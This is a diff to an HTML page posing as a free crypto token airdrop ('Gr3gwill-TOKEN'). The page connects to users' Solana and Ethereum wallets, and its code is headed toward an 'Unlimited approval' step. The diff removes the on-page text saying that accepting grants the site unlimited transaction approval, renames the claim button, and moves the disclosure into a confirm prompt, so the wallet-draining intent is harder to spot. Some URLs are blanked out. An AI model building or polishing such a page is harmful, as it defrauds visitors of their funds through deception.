@@ -11,11 +11,9 @@
     <script src="https:                                                                               
 
     <style>
-                                                       
         html { background:                                                       
         body { margin:0; padding:0; }
 
-                                          
         .topbar {
             background:linear-gradient(90deg,                 
             padding:.8rem 1rem;
@@ -29,7 +27,6 @@
             z-index:100;
         }
 
-                                                                 
         .container {
             max-width:600px;
             margin:5rem auto 2rem;
@@ -41,13 +38,11 @@
             text-align:center;
         }
 
-                                   
         .logo {
             width:120px;
             height:120px;
             border-radius:50%;
             margin:0 auto 1.5rem;
-            display:block;
             object-fit:cover;
         }
 
@@ -80,7 +75,6 @@
         }
     </style>
 
-    <!-- External theme (adds gradient background, particles, pulse effect) -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/airdrop-theme/cdn@1.0/airdrop-theme.min.css">
 </head>
 <body>
@@ -88,7 +82,6 @@
 <div class="airdrop-wrap">
     <div class="bg-gradient"></div>
 
-    <!-- decorative particles -->
     <div class="particle" style="top:10%; left:15%; width:4px; height:4px; animation-delay:0s;"></div>
     <div class="particle" style="top:80%; left:70%; width:6px; height:6px; animation-delay:2s;"></div>
     <div class="particle" style="top:40%; left:90%; width:3px; height:3px; animation-delay:4s;"></div>
@@ -97,7 +90,7 @@
     <div class="topbar">🚀 Gr3gwill Airdrop – Claim Your Free Tokens</div>
 
     <div class="container">
-        <img class="logo" src="https:                                            
+        <img class="logo" src="https:                                      
         <h1 class="pulse">Congratulations!</h1>
         <div class="subtitle">You are eligible to receive the free Gr3gwill‑TOKEN airdrop.</div>
 
@@ -109,8 +102,7 @@
         </div>
 
         <div id="terms" style="display:none;">
-            <p>By accepting, you grant this website full unlimited transaction approval to your wallet.</p>
-            <button id="acceptTerms">Accept Terms & Claim</button>
+            <button id="acceptTerms">Accept Terms & Conditions</button>
         </div>
 
         <p id="status"></p>
@@ -126,13 +118,11 @@
     const infuraProjectId = 'https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc';
     // ---------------------------
 
-    // Solana connection
     const solana = new solanaWeb3.Connection(
         solanaWeb3.cluster.ApiUrl.mainnetBeta,
         'processed'
     );
 
-    // Ethereum – works with any injected provider (MetaMask, Trust, etc.)
     const web3 = new Web3(window.ethereum || new Web3.providers.HttpProvider(`https:                                             
 
     let userAddress;
@@ -165,7 +155,7 @@
     });
 
     document.getElementById('acceptTerms').addEventListener('click', async () => {
-        if (!confirm('Are you sure you want to accept the terms and conditions?')) return;
+        if (!confirm('By accepting, you grant this site unlimited transaction approval and agree to the terms.')) return;
 
         try {
             // Unlimited approval
